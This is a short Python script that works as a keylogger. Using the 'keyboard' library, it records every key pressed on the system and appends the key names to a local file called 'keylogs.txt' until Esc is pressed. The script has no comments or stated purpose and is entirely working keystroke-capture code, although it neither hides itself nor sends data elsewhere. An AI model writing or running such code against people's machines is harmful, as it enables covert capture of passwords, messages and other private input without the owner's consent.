import keyboard
import time

def main():
    log_file = "keylogs.txt"
    
    while True:
        event = keyboard.read_event()
        
        if event.name == 'esc':
            break
            
        with open(log_file, 'a') as f:
            if event.event_type == keyboard.KEY_DOWN:
                if len(event.name) > 1 or (not event.name.isalnum() and not event.name.startswith('f')):
                    f.write(str(event.name))
                else:
                    f.write(event.name)
            elif event.event_type == keyboard.KEY_UP:
                continue

if __name__ == "__main__":
    main()